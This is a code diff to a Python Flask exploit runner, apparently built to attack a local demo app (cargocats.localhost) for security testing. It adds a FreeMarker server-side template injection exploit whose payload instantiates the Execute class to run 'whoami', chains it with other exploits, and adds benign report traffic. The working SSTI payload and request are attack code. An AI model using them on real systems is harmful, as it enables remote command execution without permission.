@@ -597,6 +597,35 @@ def exploit_deserialization():
     finally:
         exploit_running = False
 
+@app.route('/exploit/ssti')
+def exploit_ssti():
+    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
+    
+    if exploit_running:
+        return jsonify({"status": "error", "message": "Exploit already running"}), 400
+    
+    exploit_running = True
+    exploit_state = "ssti_exploit"
+    
+    try:
+        session = requests.Session()
+        # Login first
+        login_result = run_login_exploit(session)
+        if not login_result:
+            log_exploit_output("Login failed - cannot proceed with SSTI exploit", "ERROR")
+            return jsonify({"status": "error", "message": "Login failed - cannot proceed with SSTI exploit"}), 500
+        
+        result = run_ssti_exploit(session)
+        exploit_state = "finished"
+        log_exploit_output(f"SSTI exploit completed - Success: {result}")
+        return jsonify({"status": "success", "message": "SSTI exploit completed", "result": result}), 200
+    except Exception as e:
+        exploit_state = "error"
+        log_exploit_output(f"SSTI exploit failed: {str(e)}", "ERROR")
+        return jsonify({"status": "error", "message": f"SSTI exploit failed: {str(e)}"}), 500
+    finally:
+        exploit_running = False
+
 @app.route('/exploit/list')
 def exploit_list():
     """List all available individual exploits"""
@@ -609,7 +638,8 @@ def exploit_list():
         {"name": "Log4Shell", "endpoint": "/exploit/log4shell", "description": "Log4j JNDI injection exploit"},
         {"name": "SSJS Injection", "endpoint": "/exploit/ssjs-injection", "description": "Server-side JavaScript injection"},
         {"name": "XXE", "endpoint": "/exploit/xxe", "description": "XML External Entity injection"},
-        {"name": "Insecure Deserialization", "endpoint": "/exploit/deserialization", "description": "Java Insecure Deserialization exploit using address import functionality"}
+        {"name": "Insecure Deserialization", "endpoint": "/exploit/deserialization", "description": "Java Insecure Deserialization exploit using address import functionality"},
+        {"name": "SSTI", "endpoint": "/exploit/ssti", "description": "FreeMarker Server-Side Template Injection (CVE-2025-66474)"}
     ]
     
     return jsonify({
@@ -1443,6 +1473,48 @@ def run_deserialization_exploit(session):
         log_exploit_output(f"Error during deserialization exploit: {str(e)}", "ERROR")
         return False
 
+def run_ssti_exploit(session):
+    """Execute FreeMarker SSTI exploit via report template generation (CVE-2025-66474)"""
+    log_exploit_output("Executing FreeMarker SSTI exploit via report template generation")
+    
+    try:
+        # Send malicious FreeMarker template that uses ?new to instantiate Execute class
+        ssti_payload = '${"freemarker.template.utility.Execute"?new()("whoami")}'
+        report_data = {
+            "template": ssti_payload,
+            "shipmentId": "SHIP-999",
+            "recipientName": "SSTI-Test",
+            "origin": "Exploit-Origin",
+            "destination": "Exploit-Dest"
+        }
+        r = session.post("http://cargocats.localhost/api/reports/generate", json=report_data, timeout=10, allow_redirects=False)
+        log_exploit_output(f"SSTI exploit response status: {r.status_code}")
+        log_exploit_output(f"SSTI exploit response body: {r.text[:500] if r.text else 'Empty'}")
+        
+        if r.status_code == 200:
+            try:
+                response_data = r.json()
+                output = response_data.get("output", "")
+                # If the template executed whoami, the output will contain a username instead of the template literal
+                if output and ssti_payload not in output and len(output.strip()) > 0:
+                    log_exploit_output(f"SUCCESS: SSTI exploit appears successful (command output: {output.strip()})")
+                    return True
+                else:
+                    log_exploit_output("WARNING: SSTI response received but command execution unclear")
+                    return False
+            except:
+                log_exploit_output("Could not parse SSTI response for analysis")
+                return False
+        elif r.status_code == 500:
+            # A 500 with an error about Execute class still indicates the SSTI was processed
+            log_exploit_output("SSTI payload was processed by the template engine (server error may indicate partial success)")
+            return True
+        
+        return False
+    except Exception as e:
+        log_exploit_output(f"Error during SSTI exploit: {str(e)}", "ERROR")
+        return False
+
 ########################################
 # exploits
 ########################################
@@ -1552,6 +1624,14 @@ def exploit():
         if check_exploit_stop("Deserialization"):
             return
         run_deserialization_exploit(session)
+
+        # ================================================
+        # SSTI EXPLOIT (CVE-2025-66474)
+        # ================================================
+        exploit_state = "ssti_exploit"
+        if check_exploit_stop("SSTI"):
+            return
+        run_ssti_exploit(session)
 
         exploit_state = "finished"
         log_exploit_output("Exploit execution completed successfully")
@@ -1893,6 +1973,42 @@ def traffic():
         r = session.post("http://cargocats.localhost/api/labels/generate", json=label_data, timeout=10, allow_redirects=False)
         log_traffic_output(f"Label generation API POST - Status: {r.status_code}")
         
+        # ================================================
+        # PHASE 9: REPORT GENERATION
+        # ================================================
+        traffic_state = "report_generation"
+        log_traffic_output("Phase 9: Report generation")
+        
+        # Visit reports page
+        r = session.get("http://cargocats.localhost/reports", timeout=5, allow_redirects=False)
+        log_traffic_output(f"Visited reports page - Status: {r.status_code}")
+        
+        # Check report service health
+        r = session.get("http://cargocats.localhost/api/reports/health", timeout=5, allow_redirects=False)
+        log_traffic_output(f"Report service health check - Status: {r.status_code}")
+        
+        # Generate a normal shipping report
+        report_data = {
+            "template": "Cargo Cats Shipping Report\n\nShipment ID: ${shipmentId}\nRecipient: ${recipientName}\nFrom: ${origin}\nTo: ${destination}\nDate: ${date}\nCarrier: ${company}\n\nStatus: In Transit",
+            "shipmentId": "SHIP-48460B74",
+            "recipientName": "Jane Smith",
+            "origin": "Portland, OR",
+            "destination": "Austin, TX"
+        }
+        r = session.post("http://cargocats.localhost/api/reports/generate", json=report_data, timeout=10, allow_redirects=False)
+        log_traffic_output(f"Report generation POST - Status: {r.status_code}")
+        
+        # Generate a second report with different data
+        report_data_2 = {
+            "template": "Delivery Confirmation\n\nPackage ${shipmentId} for ${recipientName} has been delivered from ${origin} to ${destination}.",
+            "shipmentId": "SHIP-7B3F19A2",
+            "recipientName": "Bob Johnson",
+            "origin": "Seattle, WA",
+            "destination": "Denver, CO"
+        }
+        r = session.post("http://cargocats.localhost/api/reports/generate", json=report_data_2, timeout=10, allow_redirects=False)
+        log_traffic_output(f"Second report generation POST - Status: {r.status_code}")
+
         traffic_state = "finished"
         log_traffic_output("Traffic generation completed successfully")
         
